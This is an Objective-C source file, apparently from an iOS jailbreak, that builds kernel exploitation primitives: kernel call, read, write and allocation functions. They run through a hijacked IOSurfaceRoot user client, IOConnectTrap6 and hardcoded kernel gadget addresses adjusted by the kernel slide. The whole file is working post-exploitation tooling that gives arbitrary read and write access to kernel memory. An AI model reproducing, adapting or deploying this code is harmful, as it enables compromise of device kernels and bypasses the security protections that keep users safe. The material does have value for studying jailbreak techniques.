#import "kernel.h"
#import "utils.h"

io_connect_t user_client = 0;

extern struct kinfo kernel_info;

BOOL setup_client() {
    JBLogDebug("[*] setup kcall");

    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        JBLogDebug("[-] Failed to get IOSurfaceRoot service");
        return NO;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        JBLogDebug("[-] Failed to open IOSurfaceRoot service");
        return NO;
    }
    user_client = conn;
    IOObjectRelease(service);

    JBLogDebug("[+] Got user client: 0x%x", user_client);

    return YES;
}

uint64_t get_kernel_slide() {
    return kernel_info.kslide;
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
    uint64_t x6 = addr;  // BR X6
    x2 = x0;             // MOV X0, X2
    return IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
}

uint8_t kread8(uint64_t addr) {
    return (uint8_t)kcall(0xFFFFFFF009446D08 + get_kernel_slide(), 0, addr, 0, 0, 0, 0);
}

uint32_t kread32(uint64_t addr) {
    return (uint32_t)kcall(0xFFFFFFF009446D08 + get_kernel_slide(), 0, addr, 0, 0, 0, 0);
}

uint64_t kread64(uint64_t addr) {
    uint32_t low32 = kread32(addr);
    uint32_t high32 = kread32(addr + 0x4);
    uint64_t ret = (((uint64_t)high32) << 32) | low32;
    return ret;
}

void kread_string(uint64_t addr, char *out) {
    while (true) {
        uint64_t val = kread64(addr);
        for (int i = 0; i < 8; i++) {
            out[i] = (val >> (i * 8)) & 0xFF;
            if (out[i] == '\0') {
                return;
            }
        }
        addr += 8;
    }
}

uint64_t kalloc(size_t ksize) {
    uint64_t r = kcall(0xFFFFFFF0080B1008 + get_kernel_slide(), kernel_info.fake_userclient + 0x200, ksize / 8, 0, 0, 0, 0);
    if (r == 0) return 0;
    uint32_t low32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20);
    uint32_t high32 = kread32(kernel_info.fake_userclient + 0x200 + 0x20 + 0x4);

    return (((uint64_t)high32) << 32) | low32;
}

void kwrite64(uint64_t addr, uint64_t data) {
    kcall(0xFFFFFFF007BADBB8 + get_kernel_slide(), addr, data, addr, 0, 0, 0);
}

void kwrite32(uint64_t addr, uint32_t data) {
    uint32_t low32 = data;
    uint32_t high32 = kread32(addr + 0x4);
    kwrite64(addr, (((uint64_t)high32) << 32) | low32);
}

static void kwrite8(uint64_t addr, uint8_t data) {
    uint64_t val = kread64(addr);
    val &= ~(0xFF << ((addr % 8) * 8));
    val |= ((uint64_t)data) << ((addr % 8) * 8);
    kwrite64(addr, val);
}

void kwritebuf(uint64_t addr, void *buf, size_t size) {
    uint8_t *bytes = (uint8_t *)buf;
    for (int i = 0; i < size; i++) {
        kwrite8(addr + i, bytes[i]);
    }
}

void kreadbuf(uint64_t addr, void *buf, size_t size) {
    uint8_t *bytes = (uint8_t *)buf;
    for (int i = 0; i < size; i++) {
        bytes[i] = kread8(addr + i);
    }
}
